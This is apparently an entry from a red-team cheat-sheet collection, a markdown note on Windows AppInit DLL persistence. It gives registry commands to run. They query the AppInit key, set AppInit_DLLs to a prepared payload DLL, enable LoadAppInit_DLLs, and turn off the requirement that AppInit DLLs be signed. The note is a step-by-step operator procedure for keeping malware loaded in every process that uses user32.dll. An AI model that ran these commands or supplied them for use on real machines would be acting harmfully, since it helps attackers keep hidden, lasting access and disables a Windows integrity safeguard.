---
technique: AppInit DLL Persistence
category: persistence
targets: Windows User32 Load Path
protocols: Local
remote_capable: false
tags: windows persistence appinit dll registry
---

# AppInit DLL Persistence

AppInit DLL persistence loads a configured DLL into processes that load `user32.dll` when AppInit is enabled.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Admin registry access | AppInit keys are under HKLM |
| Prepared DLL | Payload construction belongs in a tool or payload note |
| AppInit enabled | `LoadAppInit_DLLs` must be set for loading |

## Windows

### Query AppInit

#cmd #registry #appinit

Query AppInit DLL configuration.

```cmd title:"Query AppInit DLL settings"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
```
<!-- cheat -->

### Step 1: Set AppInit DLL path

#cmd #registry #appinit

Set the AppInit DLL list to a prepared DLL path.

```cmd title:"Set AppInit DLL path"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "$dll_path" /f
```
<!-- cheat
var dll_path
-->

### Step 2: Enable AppInit loading

#cmd #registry #appinit

Enable AppInit DLL loading.

```cmd title:"Enable AppInit DLL loading"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```
<!-- cheat -->

### Step 3: Disable secure load requirement

#cmd #registry #appinit

Disable signed-only AppInit DLL loading when policy permits.

```cmd title:"Disable AppInit signed DLL requirement"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers Windows AppInit DLL persistence.
